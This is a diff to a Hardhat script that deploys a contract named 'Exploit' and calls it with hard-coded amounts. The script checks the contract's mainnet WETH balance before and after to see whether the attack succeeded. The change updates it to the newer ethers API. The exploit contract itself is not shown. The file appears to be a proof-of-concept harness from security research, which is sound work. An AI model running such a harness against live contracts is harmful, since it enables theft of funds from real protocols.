@@ -19,11 +19,13 @@ async function main() {
   const WETH = await hre.ethers.getContractAt("IERC20",'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2');
   // Deploy the PoC contract.
   const Exploit = await hre.ethers.getContractFactory("Exploit");
-  const exploit = await Exploit.deploy();
-  console.log("Exploit deployed to:", exploit.address);
+  let exploit = await Exploit.deploy();
+  exploit = await exploit.waitForDeployment();
+  const address = await exploit.getAddress();
+  console.log("Exploit deployed to:", address);
   // Let's run the exploit PoC!
-  const balance0 = await WETH.balanceOf(exploit.address);
-  console.log("Balance before exploit",balance0/1e18,"ETH");
+  const balance0 = await WETH.balanceOf(address);
+  console.log("Balance before exploit",balance0,"ETH");
   console.log("starting exploit");
   // I had a bit of trouble finding the optimal values using the
   // the Python script, values didn't seem to work.
@@ -31,13 +33,14 @@ async function main() {
   d = "207569000000000000000000"
   b = "092430000000000000000000"
   await exploit.start(d, b);
-  const balance1 = await WETH.balanceOf(exploit.address);
+  const balance1 = await WETH.balanceOf(address);
   console.log("If the balance is positive the exploit worked!");
-  console.log("Balance after exploit",balance1/1e18,"ETH");
+  console.log("Balance after exploit",balance1,"ETH");
 }
 main()
   .then(() => process.exit(0))
   .catch(error => {
     console.error(error);
     process.exit(1);
+
   });
